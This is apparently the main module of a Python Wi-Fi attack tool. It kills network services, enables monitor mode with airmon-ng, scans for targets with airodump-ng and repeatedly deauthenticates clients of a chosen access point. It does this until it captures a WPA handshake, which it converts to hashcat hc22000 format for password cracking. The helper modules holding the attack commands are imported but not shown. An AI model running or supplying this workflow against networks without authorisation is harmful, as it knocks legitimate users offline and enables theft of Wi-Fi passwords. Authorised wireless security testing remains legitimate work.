"""
Main process
"""
import asyncio
from services import Service
from scan import Scan


async def main():
    """
    Script for scanning wireless networks and capturing traffic and handshake
    between access point and clients
    """
    global interface

    # validar que cuente con al menos una interface
    interfaces_found = await Scan().get_interfaces()

    if len(interfaces_found) == 0:
        print("No wlan interface available")
        return

    interface = await Scan().get_interface(interfaces_found)

    # stop processes that may interfere
    await Service().network_manager_service('stop')
    await Service().wpa_supplicant('stop')

    await Scan().airmon_ng_start(interface=interface)

    availables_targets = await Scan().airodump_ng(
        interface=interface,
        timeout=25)

    if availables_targets is None:
        print("Targets not available")
        return

    target = await Scan().get_target(availables_targets)

    is_monitor = await Scan().validate_monitor_mode(interface)
    if not is_monitor:
        print("Mode monitor is required")
    else:
        captured_hash = None

        while not captured_hash:
            try:
                # Try to disconnect devices
                success_disconnect = await Scan().disconnect_devices(
                    interface=interface,
                    bssid=target['BSSID'],
                    attempts=8,
                    channel=target['CH']
                )

                if success_disconnect:
                    captured_hash = await Scan().catch_handshake(
                        interface=interface,
                        bssid=target['BSSID'],
                        channel=int(target['CH']),
                        timeout=30,
                        output_essid=target['ESSID']
                    )

                    if captured_hash:
                        print(f"Handshake captured file: {captured_hash}")
                else:
                    break

            except KeyboardInterrupt:
                print("Program interrupted...")
                break

        # convert_cap_to_hc22000
        if captured_hash:
            result, _ = await Service().convert_cap_to_hc22000(
                output_file_name=target['ESSID'],
                file_cap_path=captured_hash)
            if result:
                print("Process completed successfully")

        print("Finish")

    await Service().reset_interface(interface=interface)
    await Service().network_manager_service('start')
    await Service().wpa_supplicant('start')
    await Service().reset_wifi_interface(interface=interface)
    return


if __name__ == "__main__":
    interface = None
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        asyncio.run(Service().reset_interface(interface=interface))
        asyncio.run(Service().network_manager_service('start'))
        asyncio.run(Service().wpa_supplicant('start'))
        asyncio.run(Service().reset_wifi_interface(interface=interface))
